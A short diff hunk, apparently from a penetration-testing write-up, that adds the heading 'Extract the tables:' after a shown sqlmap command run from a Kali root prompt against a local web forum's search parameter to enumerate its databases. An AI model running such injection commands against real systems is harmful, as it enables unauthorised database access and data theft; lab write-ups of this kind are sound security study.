@@ -32,6 +32,6 @@ root@kali:~# sqlmap -u "http://192.168.1.250/?p=1&forumaction=search" --dbs
     sqlmap/1.0-dev - automatic SQL injection and database takeover tool
     http://sqlmap.org
 ```
-
+Extract the tables:
 
 
